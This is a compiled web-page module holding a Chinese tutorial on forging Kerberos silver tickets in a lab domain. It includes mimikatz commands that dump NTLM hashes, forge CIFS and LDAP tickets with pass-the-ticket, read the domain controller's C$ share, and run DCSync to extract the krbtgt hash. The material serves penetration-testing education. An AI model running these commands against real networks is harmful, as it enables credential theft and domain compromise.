import{_ as r,W as l,X as t,Y as e,Z as s,a0 as n,a1 as i,C as o}from"./framework-b6a07282.js";const c="/assets/1-40d6f6e1.jpg",d="/assets/2-b181b116.jpg",h="/assets/3-60a494fa.jpg",m={},u=i('<h2 id="kerberos白银票据" tabindex="-1"><a class="header-anchor" href="#kerberos白银票据" aria-hidden="true">#</a> Kerberos白银票据</h2><h3 id="服务账号介绍" tabindex="-1"><a class="header-anchor" href="#服务账号介绍" aria-hidden="true">#</a> 服务账号介绍</h3><ul><li>服务账号就是计算机主机名+$</li><li>这是用来管理服务的账号</li></ul><h3 id="白银票据原理" tabindex="-1"><a class="header-anchor" href="#白银票据原理" aria-hidden="true">#</a> 白银票据原理</h3><ul><li>白银票据伪造的是ST，只能用来访问某一个特定的服务，如果需要访问多个服务，需要多个白银票据。</li><li>在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key解密ST, 从而获得Session Key。通过Session Key解密Authenticator3,进而验证对方的身份,验证成功就让Client 访问 server上的指定服务了。</li><li>所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对某一种服务起作用。</li></ul><h3 id="实操" tabindex="-1"><a class="header-anchor" href="#实操" aria-hidden="true">#</a> 实操</h3><ul><li>前提：已经控制了域控并且使用管理员或提权到的System登陆</li></ul><p>由于被管理员发现了，你被迫下线，并且更改了krbtgt的密码，导致不能使用黄金票据。但你之前已经收集好了做白银票据的可利用信息：</p><p>需要收集的信息：</p>',9),p={href:"http://hacker.com",target:"_blank",rel:"noopener noreferrer"},b=e("li",null,"域SID：S-1-5-21-1094512304-651001315-2238218677",-1),k={href:"http://ControlFish.hacker.com",target:"_blank",rel:"noopener noreferrer"},v=e("li",null,"目标服务器服务账号的NTML Hash：25226ab55e96d488fd832fc87237f3c6",-1),_=e("li",null,"可利用的服务：共享文件",-1),f=e("li",null,"随便想一个用户名",-1),g=i('<h4 id="一、信息收集" tabindex="-1"><a class="header-anchor" href="#一、信息收集" aria-hidden="true">#</a> 一、信息收集</h4><ol><li>域名 shell net config workstation</li></ol><img src="'+c+'"><ol start="2"><li>域SID shell whoami /user</li></ol><img src="'+d+'"><ol start="3"><li>目标服务器服务账号的NTML Hash：25226ab55e96d488fd832fc87237f3c6 mimikatz sekurlsa::logonpasswords</li></ol><img src="'+h+`"><h4 id="二、制作白银票据" tabindex="-1"><a class="header-anchor" href="#二、制作白银票据" aria-hidden="true">#</a> 二、制作白银票据</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>mimikatz kerberos::tgt 查票
mimikatz kerberos::purge 清票

shell klist 查票
shell klist purge 清票

mimikatz kerberos::golden /domain:hacker.com /sid:S-1-5-21-1094512304-651001315-2238218677 /target:ControlFish.hacker.com
 /service:cifs /rc4:25226ab55e96d488fd832fc87237f3c6 /user:abcd /ptt <span class="token comment">#制作可以访问C盘共享文件服务的白银票据</span>
 
shell <span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>ControlFish.hacker.com<span class="token punctuation">\\</span>C$ <span class="token comment">#远程访问域控C盘</span>

mimikatz kerberos::golden /domain:hacker.com /sid:S-1-5-21-1094512304-651001315-2238218677 /target:ControlFish.hacker.com
 /service:ldap /rc4:25226ab55e96d488fd832fc87237f3c6 /user:abcd /ptt <span class="token comment">#制作可以LDAP服务的白银票据</span>

mimikatz lsadump::dcsync /dc:ControlFish.hacker.com /domain:hacker.com /user:krbtgt <span class="token comment">#查询域控的Krgtgt，找到NTML可制作黄金票据</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,9);function S(C,x){const a=o("ExternalLinkIcon");return l(),t("div",null,[u,e("ol",null,[e("li",null,[s("域名："),e("a",p,[s("hacker.com"),n(a)])]),b,e("li",null,[s("目标服务器的主机名："),e("a",k,[s("ControlFish.hacker.com"),n(a)])]),v,_,f]),g])}const T=r(m,[["render",S],["__file","Kerberos白银票据.html.vue"]]);export{T as default};
